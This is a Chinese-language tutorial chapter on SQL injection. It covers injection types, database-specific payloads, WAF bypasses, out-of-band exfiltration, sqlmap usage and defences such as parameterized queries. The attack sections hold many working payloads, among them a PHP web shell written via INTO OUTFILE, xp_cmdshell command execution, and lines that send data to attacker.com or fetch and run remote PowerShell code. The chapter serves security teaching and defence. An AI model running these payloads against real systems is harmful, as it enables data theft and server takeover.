---
title: "SQL注入深度分析"
type: docs
weight: 7
---

## 八、SQL注入深度分析

SQL注入（SQL Injection）自1998年被首次公开披露以来，连续二十多年位居OWASP Top 10安全风险榜单。尽管参数化查询等防御手段已经普及，但根据2024年OWASP报告，注入类漏洞仍然占据Web应用安全事件的前三位。其根本原因在于：SQL注入的本质是**信任边界 violation**——应用程序将不可信的用户输入直接拼入了具有最高数据库权限的查询语句中，而开发者往往对这种拼接的危险性缺乏直观认知。

本章从原理机制出发，系统剖析SQL注入的分类体系、各数据库方言的特有攻击向量、WAF绕过技术、自动化工具链，以及纵深防御策略。

### 8.1 SQL注入的原理机制

#### 8.1.1 从代码层面理解注入

SQL注入发生的根本条件可以用一句话概括：**用户输入被当作SQL代码执行，而非数据处理**。

以一个典型的登录查询为例：

```python
# 危险的字符串拼接方式
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
cursor.execute(query)
```

当用户输入 `admin' --` 作为用户名时，最终执行的SQL变为：

```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```

`--` 是SQL注释符，它将后面的密码检查条件注释掉，使得攻击者无需知道密码即可登录。

#### 8.1.2 注入成立的三个必要条件

| 条件 | 说明 | 示例 |
|------|------|------|
| **用户可控输入** | 应用将用户输入直接拼入SQL语句 | GET/POST参数、Cookie、HTTP头 |
| **输入进入SQL上下文** | 输入数据被当作SQL语句的一部分执行 | 字符串拼接、格式化字符串 |
| **执行结果可被观察** | 攻击者能推断出注入是否成功 | 页面回显、报错信息、响应时间差异 |

缺少任何一个条件，经典的SQL注入都无法成立。但需要注意的是，即使没有直接回显，通过布尔盲注和时间盲注仍然可以提取数据——这正是SQL注入难以根除的原因之一。

#### 8.1.3 SQL语句的上下文分析

理解注入点所在的SQL上下文是构造有效payload的前提：

```sql
-- 上下文1：字符串型注入点
SELECT * FROM users WHERE name = '[USER_INPUT]'
-- 闭合方式：' 

-- 上下文2：数字型注入点
SELECT * FROM products WHERE id = [USER_INPUT]
-- 无需闭合，直接拼接

-- 上下文3：ORDER BY子句
SELECT * FROM users ORDER BY [USER_INPUT]
-- 不能使用UNION，需要用布尔条件或报错注入

-- 上下文4：INSERT/UPDATE语句
INSERT INTO logs (action) VALUES ('[USER_INPUT]')
-- 注入后可能执行任意SQL

-- 上下文5：LIMIT子句（MySQL特有）
SELECT * FROM users LIMIT [USER_INPUT], 10
-- 可用PROCEDURE进行报错注入
```

每个上下文的注入方式、可用关键字和限制条件都不同。盲目使用统一payload是初学者最常犯的错误。

### 8.2 SQL注入分类详解

#### 8.2.1 按注入位置分类

**GET参数注入**

通过URL查询字符串传递恶意参数，是最常见的注入入口。HTTP GET请求会被记录在服务器日志、浏览器历史和代理日志中，攻击痕迹容易留存。

```text
http://example.com/user?id=1' OR '1'='1
http://example.com/search?q=test' UNION SELECT 1,@@version-- -
```

**POST参数注入**

通过HTTP请求体传递，不会出现在URL中，相对隐蔽。需要使用Burp Suite等代理工具截获和修改请求。

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything
```

**Cookie注入**

当应用程序从Cookie中读取值并拼入SQL时，攻击者可以修改Cookie触发注入。一些WAF和IDS对Cookie字段的检查较弱，因此Cookie注入有时能绕过检测。

```http
GET /dashboard HTTP/1.1
Cookie: user_id=1' OR '1'='1; session=abc123
```

**HTTP头部注入**

当服务器将HTTP头（如`X-Forwarded-For`、`User-Agent`、`Referer`）写入数据库时（常见于访问日志记录功能），这些头部也可成为注入点。这类注入特别危险，因为开发者往往不会对这些"非用户输入"字段做安全过滤。

```http
GET /page HTTP/1.1
X-Forwarded-For: 127.0.0.1' OR '1'='1
User-Agent: Mozilla/5.0' UNION SELECT 1,@@version-- -
```

**二阶注入（Second-Order Injection）**

二阶注入是一种更隐蔽的攻击模式：

1. **存储阶段**：攻击者提交包含SQL片段的输入，应用程序对其做了转义后存入数据库。转义本身是正确的，但恶意数据已经被持久化。
2. **触发阶段**：应用程序在后续操作中从数据库读取该数据，并在没有转义的情况下拼入新的SQL语句，此时注入生效。

```text
# 第一阶段：注册用户名 admin'--
# 应用转义为 admin\'-- 并存入数据库

# 第二阶段：修改密码功能读取该用户名
query = "UPDATE users SET password='" + new_pass + "' WHERE username='" + db_username + "'"
# db_username 从数据库直接读取，未经转义，注入生效
```

二阶注入的防御难度远高于一阶注入，因为它绕过了输入验证——恶意数据在存储时是安全的，但在被重新使用时变得危险。

#### 8.2.2 按注入技术分类

**联合查询注入（UNION SELECT）**

条件：页面有数据回显，且注入点位于SELECT语句中。

原理：UNION操作符将两条SELECT语句的结果合并。攻击者通过追加一条SELECT来读取任意表的数据。关键约束是两条SELECT必须返回相同数量的列，且对应列的数据类型必须兼容。

```sql
-- 步骤1：确定原始查询的列数
?id=1' ORDER BY 1-- -   -- 正常
?id=1' ORDER BY 2-- -   -- 正常
?id=1' ORDER BY 3-- -   -- 正常
?id=1' ORDER BY 4-- -   -- 报错 → 列数为3

-- 步骤2：确定回显位
?id=-1' UNION SELECT 1,2,3-- -
-- 页面显示数字2和3 → 第2、3列为回显位

-- 步骤3：提取数据
?id=-1' UNION SELECT 1,@@version,database()-- -
?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
```

注意使用`id=-1`使原始查询返回空结果，避免干扰UNION结果的显示。

**报错注入**

条件：应用程序将数据库错误信息显示给用户（或写入可访问的日志）。

原理：利用数据库函数在处理非法输入时产生的错误消息，将查询结果嵌入错误信息中返回给攻击者。

```sql
-- MySQL: extractvalue()
?id=1' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))-- -
-- 报错信息：XPATH syntax error: '~5.7.34~'

-- MySQL: updatexml()
?id=1' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)-- -

-- MySQL: floor() 双查询报错
?id=1' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT @@version),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

-- PostgreSQL: CAST报错
?id=1' AND 1=CAST((SELECT version()) AS INT)-- -
-- 报错信息中包含PostgreSQL版本

-- MSSQL: CONVERT报错
?id=1' AND 1=CONVERT(INT,(SELECT @@version))-- -
```

报错注入的限制是错误信息通常有长度上限（MySQL的extractvalue限制32字符），因此需要用`substring()`分段提取。

**布尔盲注**

条件：页面没有数据回显也没有报错，但根据注入条件的真假会呈现不同的页面状态（如正常页面 vs 空白页面、"存在" vs "不存在"提示）。

原理：通过逐字符构造判断条件，每次观察页面响应来推断一位数据。提取一个字符平均需要7-8次请求（二分法），因此速度较慢。

```sql
-- 判断数据库名第一个字符
?id=1' AND (SELECT substring(database(),1,1))>'m'-- -  -- 真→页面正常
?id=1' AND (SELECT substring(database(),1,1))>'t'-- -  -- 假→页面异常
?id=1' AND (SELECT substring(database(),1,1))>'p'-- -  -- 真
?id=1' AND (SELECT substring(database(),1,1))>'s'-- -  -- 假
?id=1' AND (SELECT substring(database(),1,1))='q'-- -  -- 真 → 第一个字符是q

-- 使用ascii()提高效率（二分法）
?id=1' AND ascii(substring(database(),1,1))>109-- -
?id=1' AND ascii(substring(database(),1,1))>115-- -
...
```

**时间盲注**

条件：页面没有任何可见变化（无回显、无报错、布尔状态也无法区分），唯一可控的信号是响应时间。

原理：通过条件判断语句控制`sleep()`的执行，根据响应延迟推断数据。

```sql
-- MySQL时间盲注
?id=1' AND IF(ascii(substring(database(),1,1))>109,sleep(5),0)-- -
-- 响应延迟>5秒 → 条件为真

-- PostgreSQL时间盲注
?id=1'; SELECT CASE WHEN (ascii(substring(current_database(),1,1))>109) THEN pg_sleep(5) ELSE pg_sleep(0) END;-- -

-- MSSQL时间盲注
?id=1'; IF (ascii(substring(db_name(),1,1))>109) WAITFOR DELAY '0:0:5'-- -
```

时间盲注是所有注入技术中最慢的，提取一个普通长度的数据库名可能需要数百甚至数千次请求。实际渗透中通常配合sqlmap的多线程和智能优化来加速。

**堆叠查询（Stacked Queries）**

条件：数据库驱动允许多条SQL语句用分号分隔执行。MySQL的`mysqli_multi_query()`支持，但默认的`mysqli_query()`不支持；PostgreSQL和MSSQL默认支持。

```sql
-- 一次请求同时执行查询和写入
?id=1'; INSERT INTO admin(username,password) VALUES('hacker','your_password');-- -

-- 创建新表存储数据（当UNION和报错都不可用时的备选方案）
?id=1'; CREATE TABLE tmp(data text); INSERT INTO tmp SELECT @@version;-- -
```

堆叠查询的威力在于可以执行INSERT、UPDATE、DELETE甚至DDL语句，但MySQL默认配置下通常不可用。

#### 8.2.3 各注入技术的适用场景对比

| 技术 | 需要回显 | 需要报错 | 速度 | 隐蔽性 | 数据库支持 |
|------|----------|----------|------|--------|------------|
| UNION注入 | ✅ 必须 | ❌ | 快 | 低 | 所有主流DB |
| 报错注入 | ❌ | ✅ 必须 | 快 | 低 | MySQL/MSSQL/PG |
| 布尔盲注 | ❌ | ❌ | 慢 | 中 | 所有主流DB |
| 时间盲注 | ❌ | ❌ | 极慢 | 高 | 所有主流DB |
| 堆叠查询 | ❌ | ❌ | 快 | 低 | PG/MSSQL/部分MySQL |

实际渗透中，通常按"联合查询→报错注入→布尔盲注→时间盲注"的优先级尝试，选择最快能达到目标的方式。

### 8.3 数据库特定注入技术

不同数据库的SQL方言、内置函数和权限模型差异显著。以下是主流数据库的注入要点。

#### 8.3.1 MySQL注入

MySQL是Web应用中使用最广泛的数据库，也是CTF和实战中最常遇到的目标。

**信息收集阶段**

```sql
-- 版本检测（5.x和8.x在information_schema支持上有差异）
?id=1' UNION SELECT 1,@@version,3-- -
?id=1' UNION SELECT 1,@@version_compile_os,@@datadir-- -

-- 当前用户和权限
?id=1' UNION SELECT 1,user(),3-- -
?id=1' UNION SELECT 1,current_user(),3-- -
?id=1' UNION SELECT 1,super_priv,3 FROM mysql.user WHERE user=user()-- -

-- 数据库枚举
?id=1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -
```

**表和列枚举**

```sql
-- 指定数据库的表名
?id=1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='target_db'-- -

-- 指定表的列名
?id=1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' AND table_schema='target_db'-- -

-- MySQL 5.7+中，information_schema.tables的查询可能被限制
-- 备选：mysql.innodb_table_stats
?id=1' UNION SELECT 1,group_concat(table_name),3 FROM mysql.innodb_table_stats WHERE database_name='target_db'-- -
```

**数据提取**

```sql
-- 提取用户凭据
?id=-1' UNION SELECT 1,group_concat(username,0x3a,password SEPARATOR 0x0a),3 FROM users-- -

-- 使用0x3a作为分隔符（冒号的十六进制），避免与SQL语法冲突
-- 使用0x0a作为行分隔符，使输出更清晰
```

**文件操作**

```sql
-- 读取文件（需要FILE权限）
?id=1' UNION SELECT 1,load_file('/etc/passwd'),3-- -
?id=1' UNION SELECT 1,load_file('C:\\Windows\\system32\\drivers\\etc\\hosts'),3-- -

-- 写入文件（需要FILE权限 + secure_file_priv允许）
?id=1' UNION SELECT 1,'<?php @eval($_POST["cmd"]);?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -

-- 检查secure_file_priv设置
?id=1' UNION SELECT 1,@@secure_file_priv,3-- -
-- 空字符串=可读写任意路径，NULL=禁用，指定路径=只能在该路径操作
```

**MySQL特有技巧**

```sql
-- 内联注释绕过WAF
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
-- /*!50000*/ 表示MySQL版本>=5.0.00时执行

-- 布尔盲注中的异或技巧
?id=1' XOR (ascii(substring(database(),1,1))>109)-- -
-- XOR在条件为真时返回0（假），配合原始条件可区分

-- REGEXP正则匹配（替代等号）
?id=1' AND (SELECT @@version) REGEXP '^5\.'-- -
```

#### 8.3.2 PostgreSQL注入

PostgreSQL在企业级应用中广泛使用，其注入语法与MySQL有显著差异。

**信息收集**

```sql
-- 版本信息
?id=1' UNION SELECT 1,version(),3-- -

-- 当前数据库和用户
?id=1' UNION SELECT 1,current_database(),3-- -
?id=1' UNION SELECT 1,current_user,3-- -
?id=1' UNION SELECT 1,session_user,3-- -

-- 数据库枚举
?id=1' UNION SELECT 1,string_agg(datname,','),3 FROM pg_database-- -
```

**表和列枚举**

```sql
-- 表名（PostgreSQL的information_schema和pg_catalog并存）
?id=1' UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public'-- -

-- 列名
?id=1' UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_name='users'-- -

-- pg_catalog方式（更底层）
?id=1' UNION SELECT 1,relname,3 FROM pg_class WHERE relkind='r' AND relnamespace=(SELECT oid FROM pg_namespace WHERE nspname='public')-- -
```

**PostgreSQL特有攻击向量**

```sql
-- 大对象（Large Object）读取文件
?id=1'; CREATE TABLE tmp(data text); COPY tmp FROM '/etc/passwd';-- -
-- 然后通过UNION读取tmp表的内容

-- 使用pg_read_file()（需要superuser权限）
?id=1' UNION SELECT 1,pg_read_file('/etc/passwd'),0,0-- -

-- 命令执行（需要dba/superuser权限）
?id=1'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';-- -
?id=1' UNION SELECT 1,cmd_output,3 FROM cmd_exec-- -

-- PostgreSQL 9.3+ 的DO语句执行匿名代码块
?id=1'; DO $$ BEGIN EXECUTE 'CREATE TABLE pwn(data text)'; END $$;-- -

-- 利用dblink扩展进行外带数据（Out-of-Band）
?id=1' UNION SELECT 1,(SELECT * FROM dblink('host=attacker.com user=x password=x dbname=x','SELECT @@version') RETURNS (result text)),3-- -
```

#### 8.3.3 MSSQL注入

MSSQL（Microsoft SQL Server）在Windows企业环境中广泛使用，拥有丰富的系统存储过程。

**信息收集**

```sql
-- 版本信息
?id=1' UNION SELECT 1,@@version,3-- -

-- 当前用户和权限
?id=1' UNION SELECT 1,system_user,3-- -
?id=1' UNION SELECT 1,USER_NAME(),3-- -
?id=1' UNION SELECT 1,IS_SRVROLEMEMBER('sysadmin'),3-- -
-- 返回1表示当前用户是sysadmin

-- 数据库枚举
?id=1' UNION SELECT 1,name,3 FROM master..sysdatabases-- -

-- 表名枚举
?id=1' UNION SELECT 1,name,3 FROM target_db..sysobjects WHERE xtype='U'-- -

-- 列名枚举
?id=1' UNION SELECT 1,name,3 FROM target_db..syscolumns WHERE id=OBJECT_ID('target_db..users')-- -
```

**MSSQL特有攻击向量**

```sql
-- xp_cmdshell命令执行（需要sysadmin权限且xp_cmdshell已启用）
?id=1'; EXEC xp_cmdshell 'whoami';-- -

-- 启用xp_cmdshell（如果被禁用）
?id=1'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -

-- OLE自动化执行命令（备选方案）
?id=1'; DECLARE @s INT; EXEC sp_OACreate 'wscript.shell',@s OUT; EXEC sp_OAMethod @s,'run',NULL,'cmd /c whoami > C:\\temp\\out.txt';-- -

-- 堆叠查询+INSERT执行
?id=1'; INSERT INTO OPENROWSET('Microsoft.Jet.OLEDB.4.0','C:\temp\db.mdb';'admin';'','SELECT shell_cmd FROM exec_table') VALUES('whoami');-- -

-- 从MSSQL到MySQL的链接服务器
?id=1'; EXEC sp_addlinkedserver 'mysql','MySQL';-- -
```

#### 8.3.4 Oracle注入

Oracle数据库在金融、电信等行业中使用广泛，语法与MySQL/PostgreSQL差异最大。

**信息收集**

```sql
-- 版本信息
?id=1' UNION SELECT 1,banner,3 FROM v$version-- -

-- 当前用户
?id=1' UNION SELECT 1,user,3 FROM dual-- -

-- 数据库名
?id=1' UNION SELECT 1,ora_database_name,3 FROM dual-- -

-- 表名枚举
?id=1' UNION SELECT 1,table_name,3 FROM all_tables WHERE owner='TARGET_USER'-- -

-- 列名枚举
?id=1' UNION SELECT 1,column_name,3 FROM all_tab_columns WHERE table_name='USERS'-- -
```

**Oracle特有注意事项**

```sql
-- Oracle中没有information_schema，使用数据字典视图
-- all_tables, all_tab_columns, dba_tables, dba_tab_columns

-- Oracle中没有LIMIT，使用ROWNUM
?id=1' UNION SELECT 1,table_name,3 FROM (SELECT table_name,ROWNUM AS rn FROM all_tables WHERE owner='TARGET') WHERE rn=1-- -

-- Oracle中每个SELECT必须有FROM，使用dual虚拟表
?id=1' UNION SELECT 1,'test',3 FROM dual-- -

-- Oracle的注释符是 -- 后面需要有空格
-- 堆叠查询在Oracle中通常不可用（PL/SQL限制）
```

#### 8.3.5 SQLite注入

SQLite常见于移动端应用、嵌入式系统和小型Web应用。

```sql
-- SQLite没有information_schema，使用sqlite_master
?id=1' UNION SELECT 1,sql,3 FROM sqlite_master-- -
-- 返回所有表的CREATE语句

-- 表数据提取
?id=1' UNION SELECT 1,group_concat(username||':'||password),3 FROM users-- -

-- 注意：SQLite没有sleep()函数，时间盲注需要替代方案
?id=1' AND (SELECT CASE WHEN (substr(sqlite_version(),1,1)='3') THEN randomblob(999999999) ELSE 0 END)-- -
-- randomblob()消耗CPU时间模拟延迟

-- SQLite没有堆叠查询支持（大多数驱动）
-- SQLite没有文件读写功能
-- SQLite没有用户权限系统
```

### 8.4 WAF绕过技术

Web应用防火墙（WAF）通过正则匹配或机器学习模型检测恶意请求。绕过WAF的核心思路是：**在保持SQL语句语义不变的前提下，改变其字面形式，使其不匹配WAF的检测规则**。

#### 8.4.1 关键字绕过

**大小写混合**

WAF的正则规则如果未设置`i`（不区分大小写）标志，大小写变体即可绕过：

```sql
SELECT → SeLeCt → sElEcT
UNION → UnIoN → uNiOn
```

**双写绕过**

当WAF使用简单的字符串替换删除关键字时，双写可以让删除后拼接出正确的关键字：

```text
SELSELECTECT → 删除中间SELECT → SELECT
UNIunionON → 删除中间UNION → UNION
```

**编码绕过**

多重编码可以在不同解码层级产生payload：

```text
URL编码：    %53%45%4C%45%43%54 → SELECT
双重URL编码：%2553%2545%254C%2545%2543%2554 → %53%45%4C%45%43%54 → SELECT
Unicode编码：\u0053\u0045\u004C\u0045\u0043\u0054 → SELECT
Hex编码：    0x53454C454354 → SELECT
HTML实体：   &#83;&#69;&#76;&#69;&#67;&#84; → SELECT
```

**内联注释（MySQL特有）**

MySQL的内联注释`/*!...*/`中的语句会被执行，但部分WAF无法识别：

```sql
/*!UNION*/ /*!SELECT*/ 1,2,3-- -
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
UNI/**/ON SEL/**/ECT 1,2,3-- -
```

#### 8.4.2 空格和特殊字符绕过

WAF通常会对空格进行检测，以下替代字符在MySQL中可以用作空白：

| 替代字符 | URL编码 | 说明 |
|----------|---------|------|
| Tab | `%09` | 水平制表符 |
| 换行 | `%0a` | LF |
| 垂直制表符 | `%0b` | 少见，部分WAF未覆盖 |
| 换页 | `%0c` | FF |
| 回车 | `%0d` | CR |
| 注释 | `/**/` | 最常用的替代方案 |
| 括号 | `()` | 用括号包裹子查询替代空格 |

```sql
-- 使用/**/替代空格
?id=1'/**/UNION/**/SELECT/**/1,2,3-- -

-- 使用括号包裹
?id=1'UNION(SELECT(1),(2),(3))-- -

-- 混合使用
?id=1'%0aUNION%0aSELECT%0a1,2,3-- -
```

#### 8.4.3 等号和比较运算符绕过

当WAF拦截等号时，可以使用语义等价的替代方式：

```sql
-- 使用LIKE
?id=1' AND (SELECT substring(version(),1,1)) LIKE '5'-- -

-- 使用REGEXP/RLIKE
?id=1' AND (SELECT @@version) REGEXP '^5'-- -

-- 使用BETWEEN...AND
?id=1' AND (SELECT ascii(substring(database(),1,1))) BETWEEN 97 AND 99-- -

-- 使用IN()
?id=1' AND (SELECT substring(database(),1,1)) IN ('a','b','c')-- -

-- 使用异或XOR
?id=1' AND (ascii(substring(database(),1,1)) XOR 100)=0-- -

-- 使用GREATEST/LEAST
?id=1' AND GREATEST(ascii(substring(database(),1,1)),100)=100-- -
```

#### 8.4.4 HTTP参数污染（HPP）

当Web服务器处理同名参数时，不同服务器的行为不同：

```text
# 请求：?id=1&id=1' UNION SELECT 1,2,3-- -

# Apache/PHP: 取最后一个参数
# IIS/ASP:    取第一个参数
# JSP/Tomcat: 两个都取，用逗号连接

# 利用方式：WAF检查第一个参数（安全的），应用使用最后一个（恶意的）
```

#### 8.4.5 分块传输编码绕过

利用HTTP的`Transfer-Encoding: chunked`将payload分散到多个数据块中：

```http
POST /login HTTP/1.1
Transfer-Encoding: chunked

4
1' UN
6
ION SE
4
LECT
3
 1,
2
2,
3
3--
0
```

部分WAF无法正确重组分块数据，从而漏检注入payload。

### 8.5 高级注入技术

#### 8.5.1 带外数据外传（Out-of-Band, OOB）

当页面没有回显、没有报错、时间盲注又太慢时，可以通过DNS或HTTP请求将数据外传到攻击者控制的服务器。

**MySQL带外（需要LOAD_FILE和DNS解析权限）**

```sql
-- 通过DNS外传数据
?id=1' AND (SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\share')))-- -
-- Windows环境下触发SMB/DNS请求

-- 使用UDF（用户自定义函数）创建外传通道
SELECT sys_eval('ping '||(SELECT @@version)||'.attacker.com');
```

**MSSQL带外**

```sql
-- 通过DNS外传
?id=1'; DECLARE @s VARCHAR(100); SET @s=(SELECT @@version); EXEC('master..xp_dirtree "\\\\'+@s+'.attacker.com\\x"');-- -

-- 通过HTTP外传
?id=1'; EXEC master..xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/?d='+@@version+''')"'-- -
```

**PostgreSQL带外**

```sql
-- 通过dblink外传
?id=1'; SELECT * FROM dblink('host='||(SELECT current_database())||'.attacker.com','SELECT 1') RETURNS (result text);-- -
```

**DNSLog平台使用**

实际渗透中常使用DNSLog平台（如dnslog.cn、ceye.io）接收带外数据：

```sql
-- ceye.io使用示例
?id=1' AND (SELECT LOAD_FILE(CONCAT('\\\\',database(),'.xxx.ceye.io\\abc')))-- -
-- 在ceye.io平台查看DNS查询记录，子域名部分即为数据库名
```

#### 8.5.2 二次注入的深入分析

二次注入的经典场景：

```java
// 场景：用户注册 + 密码重置功能

// 注册阶段：用户名 = admin'-- 
// 应用使用PreparedStatement安全地存储到数据库
PreparedStatement ps = conn.prepareStatement("INSERT INTO users VALUES(?, ?)");
ps.setString(1, "admin'-- ");  // 安全存储，不触发注入
ps.executeUpdate();

// 密码重置阶段：从数据库读取用户名并拼接
String username = getFromDB(userId);  // 读取到 admin'--
String sql = "UPDATE users SET password='" + newPassword + "' WHERE username='" + username + "'";
// 最终SQL: UPDATE users SET password='newpass' WHERE username='admin'-- '
// 注入生效，admin的密码被修改
```

二次注入的防御核心：**从数据库读取的数据也必须视为不可信输入，使用参数化查询处理**。

#### 8.5.3 NoSQL注入

随着MongoDB等NoSQL数据库的普及，NoSQL注入成为新的攻击面。

**MongoDB注入**

```javascript
// 原始查询
db.users.find({username: username, password: password})

// 注入方式：使用MongoDB操作符
// POST参数: username=admin&password[$ne]=anything
// 等价于: db.users.find({username:"admin", password: {$ne: "anything"}})
// 匹配password不等于"anything"的所有admin用户 → 绕过认证

// 使用$gt操作符
// password[$gt]= → 匹配password大于空字符串的所有记录
// password[$regex]=.* → 正则匹配任意密码
```

```json
// JSON格式注入（Content-Type: application/json）
{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}
// 匹配所有用户，绕过认证
```

**防御NoSQL注入的关键**：对查询参数进行类型检查，确保用户输入的类型与预期一致（字符串就不能接受对象）。

#### 8.5.4 ORM注入

ORM（对象关系映射）框架并不能自动防止SQL注入，不当使用仍然会产生漏洞。

```python
# Django ORM中的危险用法
User.objects.extra(where=[f"username='{username}'"])  # 危险！
User.objects.raw(f"SELECT * FROM users WHERE username='{username}'")  # 危险！

# 安全用法
User.objects.filter(username=username)  # 安全，自动参数化
User.objects.raw("SELECT * FROM users WHERE username=%s", [username])  # 安全
```

```java
// Hibernate HQL注入
String hql = "FROM User WHERE name = '" + name + "'";
Query query = session.createQuery(hql);  // 危险！

// 安全用法
String hql = "FROM User WHERE name = :name";
Query query = session.createQuery(hql);
query.setParameter("name", name);  // 安全
```

### 8.6 自动化SQL注入工具

#### 8.6.1 sqlmap高级用法

sqlmap是SQL注入自动化的事实标准工具，但大多数人只用到了它10%的功能。

**基础扫描流程**

```bash
# 基础GET参数扫描
sqlmap -u "http://example.com/page?id=1" --batch --dbs

# 扫描POST请求（从Burp导出的请求文件）
sqlmap -r request.txt --batch

# 指定注入技术（B=布尔,E=报错,U=联合,S=堆叠,T=时间,Q=内联查询）
sqlmap -u "http://example.com/page?id=1" --technique=BEU

# 指定数据库类型（减少探测时间）
sqlmap -u "http://example.com/page?id=1" --dbms=mysql

# 设置请求间隔（避免触发速率限制）
sqlmap -u "http://example.com/page?id=1" --delay=2
```

**WAF绕过配置**

```sql
# 使用内置tamper脚本
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,between,randomcase

# 常用tamper脚本组合
# space2comment: 空格→/**/
# between: > → BETWEEN, = → LIKE
# randomcase: 随机大小写
# charencode: URL编码
# base64encode: Base64编码

# 自定义payload前缀和后缀
sqlmap -u "http://example.com/page?id=1" --prefix="'" --suffix="-- -"

# 使用自定义User-Agent
sqlmap -u "http://example.com/page?id=1" --user-agent="Mozilla/5.0..."

# 使用代理（配合Burp手动调整）
sqlmap -u "http://example.com/page?id=1" --proxy="http://127.0.0.1:8080"
```

**高级功能**

```bash
# 文件系统操作
sqlmap -u "http://example.com/page?id=1" --file-read="/etc/passwd"
sqlmap -u "http://example.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/"

# 操作系统命令执行
sqlmap -u "http://example.com/page?id=1" --os-shell
sqlmap -u "http://example.com/page?id=1" --os-cmd="whoami"

# 数据库交互Shell
sqlmap -u "http://example.com/page?id=1" --sql-shell

# 批量扫描（从文件读取URL列表）
sqlmap -m urls.txt --batch --output-dir=./results

# 绕过HTTPS证书验证
sqlmap -u "https://example.com/page?id=1" --force-ssl

# 优化性能
sqlmap -u "http://example.com/page?id=1" --threads=10 --predict-output
# --predict-output: 基于之前的输出预测后续字符，减少请求次数
# --threads: 并发线程数
```

**sqlmap的tamper脚本自定义**

当内置tamper不够用时，可以编写自定义脚本：

```python
#!/usr/bin/env python
"""自定义tamper：将关键字替换为MySQL内联注释"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    if payload:
        payload = payload.replace("UNION", "/**/UNION/**/")
        payload = payload.replace("SELECT", "/**/SELECT/**/")
        payload = payload.replace("FROM", "/**/FROM/**/")
    return payload
```

#### 8.6.2 其他工具

| 工具 | 特点 | 适用场景 |
|------|------|----------|
| **sqlmap** | 全自动，功能最全面 | 通用场景 |
| **Havij** | GUI界面，操作简单 | Windows环境快速测试 |
| **BSQL Hacker** | 自动化盲注 | 无回显场景 |
| **BBQSQL** | 高度可定制的盲注框架 | 复杂WAF绕过 |
| **Jeeves** | 针对Java应用优化 | J2EE环境 |
| **Mole** | 二叉树优化的盲注 | 提升盲注速度 |

### 8.7 SQL注入防御体系

理解攻击的最终目的是构建有效的防御。以下从代码层、架构层和运维层三个维度阐述纵深防御策略。

#### 8.7.1 代码层防御

**参数化查询（Prepared Statements）——最核心的防御手段**

参数化查询将SQL语句的结构和数据完全分离，数据库引擎在编译阶段就确定了语句结构，用户输入只能作为数据传入，绝不可能被解释为SQL代码。

```python
# Python - psycopg2 (PostgreSQL)
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))

# Python - SQLAlchemy ORM
user = session.query(User).filter(User.username == username).first()

# Java - PreparedStatement
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");
ps.setString(1, username);
ps.setString(2, password);

# PHP - PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute(['username' => $username, 'password' => $password]);

# Node.js - mysql2
const [rows] = await connection.execute('SELECT * FROM users WHERE username = ?', [username]);

# Go - database/sql
row := db.QueryRow("SELECT * FROM users WHERE username = $1 AND password = $2", username, password)
```

**存储过程的安全使用**

```sql
-- 创建安全的存储过程
CREATE PROCEDURE GetUser(@Username NVARCHAR(50))
AS
BEGIN
    SELECT * FROM users WHERE username = @Username
END

-- 调用
EXEC GetUser @Username = 'admin'
```

注意：存储过程内部如果使用动态SQL拼接，仍然存在注入风险。安全性取决于过程内部的实现方式。

**输入验证——辅助而非主要防御**

```python
# 白名单验证（推荐用于结构化输入）
import re

def validate_id(value):
    """只允许正整数"""
    if re.match(r'^\d+$', str(value)):
        return int(value)
    raise ValueError("Invalid ID")

def validate_sort_column(value):
    """白名单允许的列名"""
    allowed = {'id', 'name', 'created_at'}
    if value in allowed:
        return value
    raise ValueError("Invalid column")

# 黑名单验证（不推荐，容易被绕过）
def basic_filter(value):
    dangerous = ["'", '"', ";", "--", "/*", "*/", "xp_", "exec", "union", "select"]
    for pattern in dangerous:
        if pattern.lower() in value.lower():
            raise ValueError("Potentially dangerous input")
    return value
```

**输出编码——防止二次伤害**

即使发生注入，输出编码也可以防止XSS等二次攻击：

```python
import html

def safe_output(data):
    """HTML实体编码输出"""
    return html.escape(str(data))
```

#### 8.7.2 架构层防御

**最小权限原则**

数据库用户应只拥有完成其功能所需的最小权限：

```sql
-- 创建只读用户
CREATE USER 'webapp_readonly'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT ON webapp.* TO 'webapp_readonly'@'localhost';

-- 创建应用用户（不含FILE、SUPER等危险权限）
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE, DELETE ON webapp.* TO 'webapp'@'localhost';
-- 不要授予 FILE, SUPER, PROCESS, SHUTDOWN 等权限

-- 禁用危险功能
SET GLOBAL local_infile = 0;  -- 禁用LOAD DATA LOCAL INFILE
